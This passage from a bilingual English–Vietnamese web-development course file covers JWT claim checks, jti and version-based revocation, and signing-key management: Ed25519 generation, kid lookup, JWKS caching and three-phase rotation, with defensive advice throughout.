  <div class="lz-step"><span class="lz-k">Đồng hồ sai thì SỬA ĐỒNG HỒ</span><span class="lz-t">Đừng sửa dung sai</span><span class="lz-d">Một dung sai lớn là cách chữa cháy cho một vấn đề hạ tầng, và nó làm YẾU đi mọi token. <code>timedatectl status</code> và một NTP client chạy đúng mới là cách vá thật, và chúng còn vá được nhiều thứ khác.</span></div>
  <div class="lz-step"><span class="lz-k">TỪ CHỐI, đừng sửa chữa</span><span class="lz-t">Với bất kỳ claim nào trượt</span><span class="lz-d">Thiếu <code>aud</code>, <code>exp</code> không phân tích được, <code>iss</code> lạ — tất cả đều là 401, tất cả giống hệt nhau với bên gọi. ĐỪNG BAO GIỜ lùi về "ừ thì chữ ký hợp lệ mà"; đó chính xác là lối suy nghĩ mà bài này sinh ra để ngăn.</span></div>
</div>

<h3><code>jti</code>, và cơ chế thu hồi mà bạn kham nổi</h3>
<pre><code><span class="tok-comment">// Một danh sách CHẶN nhỏ, chỉ giữ trong đúng tuổi thọ của token</span>
export async function blockToken(jti: string, expSeconds: number) {
  const remaining = expSeconds - Math.floor(Date.now() / 1000);
  if (remaining &gt; 0) await redis.set(&#96;chan:\${jti}&#96;, '1', { EX: remaining });
}

export async function blocked(jti: string) {
  return (await redis.exists(&#96;chan:\${jti}&#96;)) === 1;
}</code></pre>
<div class="lz-stack">
  <div class="lz-layer"><span class="lz-lname">Danh sách chặn TỰ NHỎ theo cấu tạo</span><span class="lz-lnote">Một mục chỉ sống tới đúng lúc token đằng nào cũng hết hạn. Với token mười lăm phút, danh sách giữ mười lăm phút thu hồi — nhiều lắm là vài nghìn mục, không phải hàng triệu. Đó là thứ làm cho cách này kham được ở nơi mà một kho phiên đầy đủ bị coi là "quá nhiều".</span></div>
  <div class="lz-layer"><span class="lz-lname">Nó LÔI LẠI một lần tra cứu</span><span class="lz-lnote">Hãy trung thực về điều này: bây giờ bạn hỏi một kho ở MỌI request, đúng cái chi phí mà bạn né bằng cách không dùng phiên. Khác biệt là Redis ở đây là TUỲ CHỌN — token vẫn tự hết hạn nếu danh sách chặn không với tới được, nên bạn có thể cho qua khi cache chết.</span></div>
  <div class="lz-layer"><span class="lz-lname">Cách rẻ hơn: một SỐ PHIÊN BẢN</span><span class="lz-lnote">Giữ <code>phienBanToken</code> trên hàng người dùng, nhét nó vào token, và so lúc xác minh. Tăng nó lên là vô hiệu hoá MỌI token của người đó cùng lúc — thoát mọi thiết bị, đổi mật khẩu, gỡ vai trò. Nó tốn một lần tra người dùng thay vì một mục cho mỗi token, và nó KHÔNG thu hồi được đúng một token lẻ.</span></div>
  <div class="lz-layer"><span class="lz-lname">Rẻ nhất trong tất cả: <code>iat</code> so với một dấu thời gian</span><span class="lz-lnote">Lưu <code>tokenHopLeTu</code> trên người dùng; từ chối mọi token có <code>iat</code> sớm hơn. Cùng tác dụng với số phiên bản mà không thêm ngữ nghĩa cột nào — và nó ĐÚNG là thứ mà "thoát khỏi mọi thiết bị" cần, với cái giá là một trường vốn đã được nạp sẵn.</span></div>
</div>
<div class="pitfall">
<p><strong>Bẫy — ngay khi bạn cần tới thu hồi bằng <code>jti</code>, hãy đọc lại Bài 3.5.</strong> Một danh sách chặn CHÍNH LÀ một kho phiên: nó là một lần tra cứu ở mọi request lên một trạng thái máy chủ có thể thay đổi. Nếu bạn tìm đến JWT để né đúng điều đó, và giờ bạn vừa thêm nó lại, thì cái lợi ích phi trạng thái đã biến mất và chỉ còn lại nhược điểm — kích thước, dữ liệu cũ, cái bẫy giây. Thiết kế GIỮ ĐƯỢC lợi ích là token ngắn hạn cộng một đường <em>REFRESH CÓ TRẠNG THÁI</em>, tức là Chương 5, chứ không phải một danh sách chặn vá vào token dài hạn.</p>
</div>
<div class="note-ct">
<p><strong>Năm dòng soát.</strong> Mọi lời gọi <code>verify</code> đều nêu tường minh <code>algorithms</code>, <code>issuer</code> và <code>audience</code> · <code>exp</code> sinh ra từ một chuỗi thời lượng, KHÔNG BAO GIỜ từ phép số học trên <code>Date.now()</code> · <code>clockTolerance</code> là vài giây một chữ số · <code>sub</code> là một id nội bộ, không phải email · và mọi claim riêng đều có tiền tố URI. Mọi thứ trong trang này rút gọn lại thành năm dòng đó, và mỗi dòng có một cú tấn công cụ thể đứng sau.</p>
</div>

<h3>Nguồn học cho bài này</h3>
<a class="link-card" href="https://datatracker.ietf.org/doc/html/rfc7519#section-4.1" target="_blank" rel="noopener"><span class="lc-ico">📋</span><span class="lc-body"><span class="lc-title">RFC 7519 §4.1 — các claim đã đăng ký</span><span class="lc-sub">datatracker.ietf.org · Bảy cái, kèm ngữ nghĩa và kiểu chính xác</span></span></a>
<a class="link-card" href="https://datatracker.ietf.org/doc/html/rfc8725#section-3.8" target="_blank" rel="noopener"><span class="lc-ico">🎯</span><span class="lc-body"><span class="lc-title">RFC 8725 §3.8 — hãy kiểm audience</span><span class="lc-sub">datatracker.ietf.org · Vì sao không có nó thì phát lại xuyên dịch vụ là mặc định</span></span></a>
<a class="link-card" href="https://github.com/panva/jose/blob/main/docs/jwt/verify/functions/jwtVerify.md" target="_blank" rel="noopener"><span class="lc-ico">✅</span><span class="lc-body"><span class="lc-title">jose — tuỳ chọn của jwtVerify</span><span class="lc-sub">github.com · Mọi tuỳ chọn, kể cả maxTokenAge và clockTolerance</span></span></a>
<a class="link-card" href="https://www.iana.org/assignments/jwt/jwt.xhtml" target="_blank" rel="noopener"><span class="lc-ico">📇</span><span class="lc-body"><span class="lc-title">IANA — sổ đăng ký claim của JWT</span><span class="lc-sub">iana.org · Mọi tên đã đăng ký, để claim riêng của bạn không đụng phải cái nào</span></span></a>
<a class="link-card codelab" href="/code-lab/tracks/authentication${REF}"><span class="lc-ico">🧪</span><span class="lc-body"><span class="lc-title">Code Lab — track "Authentication"</span><span class="lc-sub">Phát lại một token xuyên hai dịch vụ, rồi thêm một phép kiểm claim và xem nó dừng lại</span></span></a>
</div>
`,
    },
    /* ─────────────────────────── 4.4 ─────────────────────────── */
    {
      title: '4.4 — Keys, kid, JWKS, and rotating without downtime|||4.4 — Khoá, kid, JWKS, và xoay vòng không ngừng dịch vụ',
      slug: 'auth-4-4-khoa-va-jwks',
      type: 'LESSON',
      description: 'Chọn thuật toán, sinh cặp khoá, công bố khoá công qua JWKS, và xoay vòng theo ba pha để không token nào bị vỡ giữa chừng. Kèm cách cache JWKS mà không tự tạo một cú DoS, và quy trình xoay vòng KHẨN CẤP khi nghi khoá bị lộ.',
      content: `
<div class="ml-en">
<span class="eyebrow">Chapter 4 · Lesson 4.4</span>
<h2>Keys, <code>kid</code>, JWKS, and rotating without downtime</h2>
<p class="lead">Lesson 1.4 settled which kind of key: symmetric when one party both issues and verifies, asymmetric the moment a second party needs to verify. This lesson is the operational half — generating them, publishing them, naming them, and replacing them on a schedule without breaking a single token in flight.</p>

<h3>Choosing the algorithm</h3>
<div class="kv-grid">
  <div class="kv"><span class="k">EdDSA (Ed25519) — the best default</span><span class="v">32-byte keys, 64-byte signatures, fast to verify, and no parameters to choose wrongly. Supported by <code>jose</code>, by Node's <code>crypto</code>, and by most current providers. Pick this unless something you integrate with cannot.</span></div>
  <div class="kv"><span class="k">ES256 — the interoperable curve</span><span class="v">ECDSA on P-256. Small keys, wide support, and the algorithm most hardware and cloud KMS products speak. Slightly slower to verify than Ed25519, and its signatures are not deterministic — which matters only in exotic cases.</span></div>
  <div class="kv"><span class="k">RS256 — the one everything accepts</span><span class="v">2048-bit RSA with PKCS#1 v1.5 padding. Large keys, 256-byte signatures, slow to sign and quick to verify. Still the most widely supported, which is why most OIDC providers default to it. Prefer <code>PS256</code> (RSA-PSS) for new RSA deployments.</span></div>
  <div class="kv"><span class="k">HS256 — one holder only</span><span class="v">Correct and simplest when a single process signs and verifies. The moment a second service needs to verify, it becomes a second service that can <em>issue</em> — Lesson 1.4's whole argument.</span></div>
</div>
<pre><code><span class="tok-comment"># Generate an Ed25519 key pair — two commands, no parameter to get wrong</span>
openssl genpkey -algorithm ed25519 -out khoa-rieng.pem
openssl pkey -in khoa-rieng.pem -pubout -out khoa-cong.pem
wc -c khoa-rieng.pem khoa-cong.pem</code></pre>
<div class="out">119 khoa-rieng.pem
113 khoa-cong.pem
232 total

# So sanh: mot cap RSA 2048 la khoang 1.700 + 450 byte.</div>

<h3><code>kid</code>: naming a key so you can have two</h3>
<pre><code><span class="tok-comment">// The token header says WHICH key — but never says WHERE that key lives</span>
{ "alg": "EdDSA", "typ": "JWT", "kid": "2026-08" }</code></pre>
<pre><code><span class="tok-comment">// The verifier looks kid up in a FIXED MAP. No string building, no SQL.</span>
const KEYS: Record&lt;string, KeyLike&gt; = {
  '2026-08': await importSPKI(PEM_THANG_8, 'EdDSA'),
  '2026-05': await importSPKI(PEM_THANG_5, 'EdDSA'),      <span class="tok-comment">// still accepted, no longer signed with</span>
};

const kid = decodeProtectedHeader(token).kid;
const key = KEYS[kid ?? ''];
if (!key) throw new Error('kid khong biet');              <span class="tok-comment">// do NOT fall back to a default key</span>

const { payload } = await jwtVerify(token, key, { algorithms: ['EdDSA'], … });</code></pre>
<div class="pitfall">
<p><strong>Trap — falling back to a default key when the <code>kid</code> is unknown undoes the whole point.</strong> It turns "which key signed this" into "any key I have will do", which is a smaller version of the algorithm confusion in Lesson 4.2. An unknown <code>kid</code> is a rejected token. And keep the map a map: <code>kid</code> is attacker-controlled input, so it must never reach a filesystem path, a SQL query or a template string.</p>
</div>

<h3>Publishing the public keys: JWKS</h3>
<pre><code>GET https://vidu.com/.well-known/jwks.json</code></pre>
<div class="out">{
  "keys": [
    { "kty": "OKP", "crv": "Ed25519", "kid": "2026-08",
      "x": "11qYAYKxCrfVS_7TyWQHOg7hcvPapiMlrwIaaPcHURo",
      "alg": "EdDSA", "use": "sig" },
    { "kty": "OKP", "crv": "Ed25519", "kid": "2026-05",
      "x": "Fpj8YQq3nT7vR2wLmK9xZcNdEuGsT1iOaXrWvB0k5tH",
      "alg": "EdDSA", "use": "sig" }
  ]
}

# CHI khoa cong. Publish cong khai la DUNG y do —
# xac minh khong can bi mat nao, va do la toan bo diem manh.</div>
<pre><code>import { createRemoteJWKSet, jwtVerify } from 'jose';

<span class="tok-comment">// In-process cache that refetches itself; do not hand-write this part.</span>
const JWKS = createRemoteJWKSet(new URL('https://vidu.com/.well-known/jwks.json'), {
  cacheMaxAge: 10 * 60 * 1000,       <span class="tok-comment">// held for 10 minutes</span>
  cooldownDuration: 30 * 1000,       <span class="tok-comment">// unknown kid: refetch, at most once every 30 seconds</span>
  timeoutDuration: 3000,
});

const { payload } = await jwtVerify(token, JWKS, {
  algorithms: ['EdDSA'], issuer: 'https://vidu.com', audience: 'vidu-api',
});</code></pre>
<div class="lz-flow">
  <div class="lz-step"><span class="lz-k">Cache it</span><span class="lz-t">Or you fetch per request</span><span class="lz-d">A JWKS fetch on every verification turns your issuer into a hard dependency on the request path. Ten minutes is a reasonable cache: long enough to be free, short enough that a new key propagates quickly.</span></div>
  <div class="lz-step"><span class="lz-k">The unknown-<code>kid</code> refetch, rate-limited</span><span class="lz-t">The subtle part</span><span class="lz-d">When a token arrives with a <code>kid</code> you have not seen, refetch — that is how rotation propagates. But an attacker can send a thousand tokens with random <code>kid</code>s and turn that into a thousand requests to your issuer. The cooldown is what makes it safe, and a library that omits it has handed you an amplifier.</span></div>
  <div class="lz-step"><span class="lz-k">Serve it from somewhere always up</span><span class="lz-t">It is on the critical path</span><span class="lz-d">If JWKS is unreachable, nothing verifies. A static file on a CDN, or your app with a long cache header, beats a dynamic endpoint that shares a database with everything else.</span></div>
  <div class="lz-step"><span class="lz-k"><code>use</code> and <code>alg</code> are not decoration</span><span class="lz-t">Filter on them</span><span class="lz-d">A key marked <code>use: "enc"</code> must never verify a signature. If you parse the JWKS yourself, select on <code>use: "sig"</code> and on the exact <code>alg</code> — otherwise you have reintroduced algorithm choice from data you fetched.</span></div>
</div>

<h3>Rotating in three phases</h3>
<div class="lz-map">
  <div class="lz-stage">
    <span class="lz-badge">Phase 1 · publish</span>
    <div class="lz-node"><div class="lz-nbody"><span class="lz-ntitle">New key in JWKS, not signing yet</span><span class="lz-nsub">Wait one cache TTL so every verifier has it</span></div></div>
  </div>
  <div class="lz-stage">
    <span class="lz-badge">Phase 2 · switch</span>
    <div class="lz-node"><div class="lz-nbody"><span class="lz-ntitle">Sign with the new key</span><span class="lz-nsub">Old key stays published — old tokens still verify</span></div></div>
  </div>
  <div class="lz-stage">
    <span class="lz-badge">Phase 3 · retire</span>
    <div class="lz-node"><div class="lz-nbody"><span class="lz-ntitle">Remove the old key</span><span class="lz-nsub">After max token lifetime has fully passed</span></div></div>
  </div>
</div>
<pre><code><span class="tok-comment"># The real schedule, with 15-minute tokens and a 10-minute JWKS cache</span>
T+0h    Sinh khoa 2026-11. Them vao JWKS. VAN ky bang 2026-08.
T+1h    Moi ben xac minh da co ca hai khoa (cache 10 phut, du xa).
T+1h    KID_KY = "2026-11". Token moi mang kid moi.
T+2h    Token cuoi cung ky bang 2026-08 da het han (15 phut + le).
T+24h   Go 2026-08 khoi JWKS. Xoa khoa rieng cu.</code></pre>
<div class="callout ok">
<p><strong>The order is what makes it zero-downtime, and it is publish-before-sign.</strong> Doing it the other way — switch the signing key, then publish — creates a window in which live tokens reference a <code>kid</code> no verifier knows, and every request fails until caches catch up. Publish first, wait one cache TTL, then switch. The whole rotation is two config changes separated by an hour.</p>
</div>
<pre><code><span class="tok-comment">// HS256: same idea, two secrets instead of two keys</span>
const SECRET: Record&lt;string, Uint8Array&gt; = {
  'v2': Buffer.from(process.env.JWT_SECRET_V2!, 'base64'),
  'v1': Buffer.from(process.env.JWT_SECRET_V1!, 'base64'),
};
const SIGNED_WITH = 'v2';

<span class="tok-comment">// Sign with SIGNED_WITH; verify with exactly SECRET[kid]. After 24 hours, delete v1.</span></code></pre>

<h3>When you think a key has leaked</h3>
<div class="lz-stack">
  <div class="lz-layer"><span class="lz-lname">The schedule does not apply</span><span class="lz-lnote">Rotation-on-a-schedule is hygiene. A compromised key is an incident: remove it from JWKS <em>immediately</em>, and accept that every token signed with it stops working. Users re-authenticate; that is the correct outcome.</span></div>
  <div class="lz-layer"><span class="lz-lname">Rotating the key is not enough by itself</span><span class="lz-lnote">An attacker who held the key may have minted long-lived tokens under the <em>old</em> <code>kid</code>. Removing the key kills those — which is exactly why the emergency path is "remove", not "add a new one and let the old expire".</span></div>
  <div class="lz-layer"><span class="lz-lname">Bump the user-level version too</span><span class="lz-lnote">Lesson 4.3's <code>tokenHopLeTu</code>: set it to now for every user. That invalidates anything issued before this moment regardless of which key signed it, and it covers the case where you are not certain which keys were exposed.</span></div>
  <div class="lz-layer"><span class="lz-lname">Practise it before you need it</span><span class="lz-lnote">Rotate on a schedule — quarterly is plenty — precisely so that the emergency version is a familiar procedure rather than a first attempt at 3am. A rotation you have never performed is a rotation that does not work.</span></div>
</div>
<div class="note-ct">
<p><strong>Where a single-service application lands.</strong> If one Node process both signs and verifies, none of this is needed: HS256 with a 32-byte secret from Lesson 1.2, and a <code>kid</code> so that rotating that secret later is possible rather than a rewrite. Add the <code>kid</code> now even with one key — it costs a header field and it is the difference between "rotate the JWT secret" being an hour's work and being a flag day. That is the cheapest piece of future-proofing in this whole chapter.</p>
</div>

<h3>Learning sources for this lesson</h3>
<a class="link-card" href="https://datatracker.ietf.org/doc/html/rfc7517" target="_blank" rel="noopener"><span class="lc-ico">🔑</span><span class="lc-body"><span class="lc-title">RFC 7517 — JSON Web Key</span><span class="lc-sub">datatracker.ietf.org · The JWK and JWKS formats, field by field</span></span></a>
<a class="link-card" href="https://datatracker.ietf.org/doc/html/rfc8037" target="_blank" rel="noopener"><span class="lc-ico">🧮</span><span class="lc-body"><span class="lc-title">RFC 8037 — EdDSA for JOSE</span><span class="lc-sub">datatracker.ietf.org · Ed25519 in JWS and JWK, including the OKP key type</span></span></a>
<a class="link-card" href="https://github.com/panva/jose/blob/main/docs/jwks/remote/functions/createRemoteJWKSet.md" target="_blank" rel="noopener"><span class="lc-ico">🌐</span><span class="lc-body"><span class="lc-title">jose — createRemoteJWKSet</span><span class="lc-sub">github.com · Caching, cooldown and timeout, with the reasoning for each</span></span></a>
<a class="link-card" href="https://openid.net/specs/openid-connect-core-1_0.html#RotateSigKeys" target="_blank" rel="noopener"><span class="lc-ico">🔄</span><span class="lc-body"><span class="lc-title">OIDC — rotating signature keys</span><span class="lc-sub">openid.net · The publish-then-sign order, in the specification's words</span></span></a>
<a class="link-card codelab" href="/code-lab/tracks/authentication${REF}"><span class="lc-ico">🧪</span><span class="lc-body"><span class="lc-title">Code Lab — track "Authentication"</span><span class="lc-sub">Rotate a signing key in three phases with traffic running, then do it in the wrong order</span></span></a>
</div>

<div class="ml-vi">
<span class="eyebrow">Chương 4 · Bài 4.4</span>
<h2>Khoá, <code>kid</code>, JWKS, và xoay vòng không ngừng dịch vụ</h2>
<p class="lead">Bài 1.4 đã chốt LOẠI khoá: đối xứng khi một bên vừa phát vừa xác minh, bất đối xứng ngay khoảnh khắc có bên thứ hai cần xác minh. Bài này là nửa VẬN HÀNH — sinh khoá, công bố khoá, đặt tên cho khoá, và thay khoá theo lịch mà KHÔNG làm vỡ một token nào đang bay.</p>

<h3>Chọn thuật toán</h3>
<div class="kv-grid">
  <div class="kv"><span class="k">EdDSA (Ed25519) — mặc định tốt nhất</span><span class="v">Khoá 32 byte, chữ ký 64 byte, xác minh nhanh, và KHÔNG có tham số nào để chọn sai. Được <code>jose</code>, được <code>crypto</code> của Node, và phần lớn nhà cung cấp hiện hành hỗ trợ. Hãy chọn cái này trừ khi thứ bạn phải tích hợp cùng không nhận.</span></div>
  <div class="kv"><span class="k">ES256 — đường cong dễ tương thích</span><span class="v">ECDSA trên P-256. Khoá nhỏ, hỗ trợ rộng, và là thuật toán mà phần lớn sản phẩm KMS phần cứng lẫn đám mây nói được. Xác minh chậm hơn Ed25519 một chút, và chữ ký của nó không tất định — điều chỉ quan trọng trong vài ca hiếm.</span></div>
  <div class="kv"><span class="k">RS256 — cái mà MỌI THỨ đều nhận</span><span class="v">RSA 2048 bit với đệm PKCS#1 v1.5. Khoá to, chữ ký 256 byte, ký chậm và xác minh nhanh. Vẫn được hỗ trợ rộng nhất, và đó là lý do phần lớn nhà cung cấp OIDC mặc định dùng nó. Với triển khai RSA MỚI thì hãy ưu tiên <code>PS256</code> (RSA-PSS).</span></div>
  <div class="kv"><span class="k">HS256 — chỉ khi có MỘT người giữ</span><span class="v">Đúng và đơn giản nhất khi một tiến trình duy nhất vừa ký vừa xác minh. Khoảnh khắc có dịch vụ thứ hai cần xác minh, nó trở thành một dịch vụ thứ hai có thể <em>PHÁT HÀNH</em> — toàn bộ lập luận của Bài 1.4.</span></div>
</div>
<pre><code><span class="tok-comment"># Sinh cặp khoá Ed25519 — hai câu lệnh, không tham số nào để chọn sai</span>
openssl genpkey -algorithm ed25519 -out khoa-rieng.pem
openssl pkey -in khoa-rieng.pem -pubout -out khoa-cong.pem
wc -c khoa-rieng.pem khoa-cong.pem</code></pre>
<div class="out">119 khoa-rieng.pem
113 khoa-cong.pem
232 total

# So sanh: mot cap RSA 2048 la khoang 1.700 + 450 byte.</div>

<h3><code>kid</code>: đặt tên cho khoá để có thể có HAI cái</h3>
<pre><code><span class="tok-comment">// Header của token nói dùng khoá NÀO — nhưng không nói khoá đó Ở ĐÂU</span>
{ "alg": "EdDSA", "typ": "JWT", "kid": "2026-08" }</code></pre>
<pre><code><span class="tok-comment">// Bên xác minh tra kid trong một BẢN ĐỒ CỐ ĐỊNH. Không nối chuỗi, không SQL.</span>
const KEYS: Record&lt;string, KeyLike&gt; = {
  '2026-08': await importSPKI(PEM_THANG_8, 'EdDSA'),
  '2026-05': await importSPKI(PEM_THANG_5, 'EdDSA'),      <span class="tok-comment">// còn nhận, không còn ký</span>
};

const kid = decodeProtectedHeader(token).kid;
const key = KEYS[kid ?? ''];
if (!key) throw new Error('kid khong biet');              <span class="tok-comment">// KHÔNG lùi về khoá mặc định</span>

const { payload } = await jwtVerify(token, key, { algorithms: ['EdDSA'], … });</code></pre>
<div class="pitfall">
<p><strong>Bẫy — lùi về một khoá MẶC ĐỊNH khi <code>kid</code> lạ là xoá bỏ toàn bộ ý nghĩa của việc này.</strong> Nó biến "khoá nào đã ký cái này" thành "khoá nào tôi có cũng được", và đó là một phiên bản thu nhỏ của cú nhầm lẫn thuật toán ở Bài 4.2. Một <code>kid</code> lạ là một token BỊ TỪ CHỐI. Và hãy giữ cái bản đồ đúng là một bản đồ: <code>kid</code> là đầu vào do kẻ tấn công kiểm soát, nên nó KHÔNG BAO GIỜ được chạm tới một đường dẫn file, một câu SQL hay một chuỗi mẫu.</p>
</div>

<h3>Công bố khoá công: JWKS</h3>
<pre><code>GET https://vidu.com/.well-known/jwks.json</code></pre>
<div class="out">{
  "keys": [
    { "kty": "OKP", "crv": "Ed25519", "kid": "2026-08",
      "x": "11qYAYKxCrfVS_7TyWQHOg7hcvPapiMlrwIaaPcHURo",
      "alg": "EdDSA", "use": "sig" },
    { "kty": "OKP", "crv": "Ed25519", "kid": "2026-05",
      "x": "Fpj8YQq3nT7vR2wLmK9xZcNdEuGsT1iOaXrWvB0k5tH",
      "alg": "EdDSA", "use": "sig" }
  ]
}

# CHI khoa cong. Publish cong khai la DUNG y do —
# xac minh khong can bi mat nao, va do la toan bo diem manh.</div>
<pre><code>import { createRemoteJWKSet, jwtVerify } from 'jose';

<span class="tok-comment">// Cache trong tiến trình, tự tải lại; đừng tự viết phần này.</span>
const JWKS = createRemoteJWKSet(new URL('https://vidu.com/.well-known/jwks.json'), {
  cacheMaxAge: 10 * 60 * 1000,       <span class="tok-comment">// giữ 10 phút</span>
  cooldownDuration: 30 * 1000,       <span class="tok-comment">// kid lạ: tải lại, nhiều nhất 30 giây một lần</span>
  timeoutDuration: 3000,
});

const { payload } = await jwtVerify(token, JWKS, {
  algorithms: ['EdDSA'], issuer: 'https://vidu.com', audience: 'vidu-api',
});</code></pre>
<div class="lz-flow">
  <div class="lz-step"><span class="lz-k">Hãy CACHE nó</span><span class="lz-t">Không thì bạn tải cho mỗi request</span><span class="lz-d">Một lần tải JWKS ở MỌI lần xác minh biến bên phát hành thành một phụ thuộc CỨNG nằm trên đường request. Mười phút là mức cache hợp lý: đủ dài để miễn phí, đủ ngắn để một khoá mới lan nhanh.</span></div>
  <div class="lz-step"><span class="lz-k">Tải lại khi gặp <code>kid</code> lạ, CÓ giới hạn tốc độ</span><span class="lz-t">Phần tinh tế</span><span class="lz-d">Khi một token tới với <code>kid</code> bạn chưa thấy, hãy tải lại — đó là cách việc xoay vòng lan ra. Nhưng một kẻ tấn công gửi một nghìn token với <code>kid</code> ngẫu nhiên là biến điều đó thành một nghìn request tới bên phát hành của bạn. Cái thời gian nguội chính là thứ làm nó an toàn, và một thư viện bỏ qua nó vừa trao cho bạn một bộ khuếch đại.</span></div>
  <div class="lz-step"><span class="lz-k">Phục vụ nó từ chỗ LUÔN SỐNG</span><span class="lz-t">Nó nằm trên đường tối quan trọng</span><span class="lz-d">Nếu JWKS không với tới được thì KHÔNG gì xác minh được. Một file tĩnh trên CDN, hoặc chính app bạn với một header cache dài, hơn hẳn một endpoint động dùng chung cơ sở dữ liệu với mọi thứ khác.</span></div>
  <div class="lz-step"><span class="lz-k"><code>use</code> và <code>alg</code> không phải đồ trang trí</span><span class="lz-t">Hãy LỌC theo chúng</span><span class="lz-d">Một khoá đánh dấu <code>use: "enc"</code> KHÔNG BAO GIỜ được dùng để xác minh chữ ký. Nếu bạn tự phân tích JWKS thì hãy chọn theo <code>use: "sig"</code> và theo đúng <code>alg</code> — không thì bạn vừa lôi lại việc CHỌN thuật toán từ dữ liệu bạn tải về.</span></div>
</div>

<h3>Xoay vòng theo BA PHA</h3>
<div class="lz-map">
  <div class="lz-stage">
    <span class="lz-badge">Pha 1 · công bố</span>
    <div class="lz-node"><div class="lz-nbody"><span class="lz-ntitle">Khoá mới vào JWKS, CHƯA ký</span><span class="lz-nsub">Chờ hết một chu kỳ cache để mọi bên xác minh đều có nó</span></div></div>
  </div>
  <div class="lz-stage">
    <span class="lz-badge">Pha 2 · chuyển</span>
    <div class="lz-node"><div class="lz-nbody"><span class="lz-ntitle">Ký bằng khoá mới</span><span class="lz-nsub">Khoá cũ VẪN nằm trong JWKS — token cũ vẫn xác minh được</span></div></div>
  </div>
  <div class="lz-stage">
    <span class="lz-badge">Pha 3 · rút</span>
    <div class="lz-node"><div class="lz-nbody"><span class="lz-ntitle">Gỡ khoá cũ đi</span><span class="lz-nsub">Sau khi tuổi thọ tối đa của token đã trôi qua hết</span></div></div>
  </div>
</div>
<pre><code><span class="tok-comment"># Lịch thật, với token 15 phút và cache JWKS 10 phút</span>
T+0h    Sinh khoa 2026-11. Them vao JWKS. VAN ky bang 2026-08.
T+1h    Moi ben xac minh da co ca hai khoa (cache 10 phut, du xa).
T+1h    KID_KY = "2026-11". Token moi mang kid moi.
T+2h    Token cuoi cung ky bang 2026-08 da het han (15 phut + le).
T+24h   Go 2026-08 khoi JWKS. Xoa khoa rieng cu.</code></pre>
<div class="callout ok">
<p><strong>Cái làm cho nó KHÔNG ngừng dịch vụ chính là THỨ TỰ, và thứ tự đó là CÔNG BỐ TRƯỚC KHI KÝ.</strong> Làm ngược lại — chuyển khoá ký rồi mới công bố — tạo ra một cửa sổ trong đó token đang sống trỏ tới một <code>kid</code> mà không bên xác minh nào biết, và MỌI request hỏng cho tới khi cache bắt kịp. Công bố trước, chờ hết một chu kỳ cache, rồi mới chuyển. Cả cuộc xoay vòng là HAI thay đổi cấu hình cách nhau một tiếng.</p>
</div>
<pre><code><span class="tok-comment">// HS256: cùng ý tưởng, hai bí mật thay vì hai khoá</span>
const SECRET: Record&lt;string, Uint8Array&gt; = {
  'v2': Buffer.from(process.env.JWT_SECRET_V2!, 'base64'),
  'v1': Buffer.from(process.env.JWT_SECRET_V1!, 'base64'),
};
const SIGNED_WITH = 'v2';

<span class="tok-comment">// Ký bằng KY_BANG; xác minh bằng đúng cái BI_MAT[kid]. Sau 24 giờ, xoá v1.</span></code></pre>

<h3>Khi bạn NGHI một cái khoá đã rò</h3>
<div class="lz-stack">
  <div class="lz-layer"><span class="lz-lname">Cái lịch ở trên KHÔNG áp dụng</span><span class="lz-lnote">Xoay vòng theo lịch là vệ sinh định kỳ. Một cái khoá bị lộ là một SỰ CỐ: gỡ nó khỏi JWKS <em>NGAY LẬP TỨC</em>, và chấp nhận rằng mọi token ký bằng nó ngừng chạy. Người dùng xác thực lại; đó là kết cục ĐÚNG.</span></div>
  <div class="lz-layer"><span class="lz-lname">Chỉ xoay khoá thôi thì CHƯA đủ</span><span class="lz-lnote">Kẻ tấn công từng cầm khoá có thể đã đúc sẵn những token sống rất lâu dưới <code>kid</code> CŨ. Gỡ khoá đi là giết chúng — và đó chính xác là lý do đường khẩn cấp là "GỠ", không phải "thêm cái mới rồi để cái cũ tự hết hạn".</span></div>
  <div class="lz-layer"><span class="lz-lname">Hãy tăng luôn cả số phiên bản ở MỨC NGƯỜI DÙNG</span><span class="lz-lnote">Cái <code>tokenHopLeTu</code> của Bài 4.3: đặt nó thành thời điểm hiện tại cho MỌI người dùng. Điều đó vô hiệu hoá bất cứ thứ gì phát trước khoảnh khắc này bất kể khoá nào đã ký, và nó phủ được cả trường hợp bạn KHÔNG chắc những khoá nào đã bị lộ.</span></div>
  <div class="lz-layer"><span class="lz-lname">Hãy TẬP trước khi cần tới</span><span class="lz-lnote">Xoay vòng theo lịch — mỗi quý một lần là thừa — chính là để bản khẩn cấp trở thành một quy trình QUEN THUỘC chứ không phải một lần thử đầu tiên lúc ba giờ sáng. Một cuộc xoay vòng bạn chưa từng thực hiện là một cuộc xoay vòng KHÔNG chạy.</span></div>
</div>
<div class="note-ct">
<p><strong>Một ứng dụng một-dịch-vụ thì dừng ở đâu.</strong> Nếu một tiến trình Node vừa ký vừa xác minh thì không cần gì trong số này cả: HS256 với một bí mật 32 byte của Bài 1.2, và một cái <code>kid</code> để việc xoay bí mật ấy về sau là KHẢ THI chứ không phải một cuộc viết lại. Hãy thêm <code>kid</code> NGAY BÂY GIỜ dù chỉ có một khoá — nó tốn một trường header và nó là khác biệt giữa "xoay bí mật JWT" tốn một tiếng với việc nó thành một ngày cả đội đứng nhìn. Đó là mẩu chuẩn-bị-cho-tương-lai RẺ NHẤT trong cả chương này.</p>
</div>

<h3>Nguồn học cho bài này</h3>
<a class="link-card" href="https://datatracker.ietf.org/doc/html/rfc7517" target="_blank" rel="noopener"><span class="lc-ico">🔑</span><span class="lc-body"><span class="lc-title">RFC 7517 — JSON Web Key</span><span class="lc-sub">datatracker.ietf.org · Định dạng JWK và JWKS, từng trường một</span></span></a>
<a class="link-card" href="https://datatracker.ietf.org/doc/html/rfc8037" target="_blank" rel="noopener"><span class="lc-ico">🧮</span><span class="lc-body"><span class="lc-title">RFC 8037 — EdDSA cho JOSE</span><span class="lc-sub">datatracker.ietf.org · Ed25519 trong JWS và JWK, kể cả kiểu khoá OKP</span></span></a>
<a class="link-card" href="https://github.com/panva/jose/blob/main/docs/jwks/remote/functions/createRemoteJWKSet.md" target="_blank" rel="noopener"><span class="lc-ico">🌐</span><span class="lc-body"><span class="lc-title">jose — createRemoteJWKSet</span><span class="lc-sub">github.com · Cache, thời gian nguội và hạn giờ, kèm lý do cho từng cái</span></span></a>
<a class="link-card" href="https://openid.net/specs/openid-connect-core-1_0.html#RotateSigKeys" target="_blank" rel="noopener"><span class="lc-ico">🔄</span><span class="lc-body"><span class="lc-title">OIDC — xoay vòng khoá ký</span><span class="lc-sub">openid.net · Thứ tự công-bố-rồi-mới-ký, nói bằng lời của đặc tả</span></span></a>
